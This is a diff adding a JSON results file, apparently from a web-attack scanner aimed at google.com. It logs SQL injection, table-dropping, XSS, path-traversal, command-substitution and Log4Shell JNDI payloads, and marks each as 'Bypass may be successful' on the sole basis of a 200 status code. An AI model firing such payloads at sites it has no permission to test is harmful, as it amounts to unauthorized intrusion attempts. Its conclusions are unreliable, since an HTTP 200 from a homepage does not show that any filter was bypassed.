@@ -1,0 +1,52 @@
+{
+    "target": "http://google.com",
+    "method": "GET",
+    "waf": {
+        "server_header": "gws",
+        "possible_waf": false
+    },
+    "results": [
+        {
+            "payload": "' OR '1'='1",
+            "status_code": 200,
+            "length": 20146,
+            "analysis": "Bypass may be successful"
+        },
+        {
+            "payload": "'; DROP TABLE users;--",
+            "status_code": 200,
+            "length": 20064,
+            "analysis": "Bypass may be successful"
+        },
+        {
+            "payload": "<script>alert('XSS')</script>",
+            "status_code": 200,
+            "length": 20109,
+            "analysis": "Bypass may be successful"
+        },
+        {
+            "payload": "../../etc/passwd",
+            "status_code": 200,
+            "length": 20327,
+            "analysis": "Bypass may be successful"
+        },
+        {
+            "payload": "`ls`",
+            "status_code": 200,
+            "length": 20143,
+            "analysis": "Bypass may be successful"
+        },
+        {
+            "payload": "${jndi:ldap://example.com/a}",
+            "status_code": 200,
+            "length": 20230,
+            "analysis": "Bypass may be successful"
+        },
+        {
+            "payload": "%2e%2e%2f",
+            "status_code": 200,
+            "length": 20177,
+            "analysis": "Bypass may be successful"
+        }
+    ]
+}
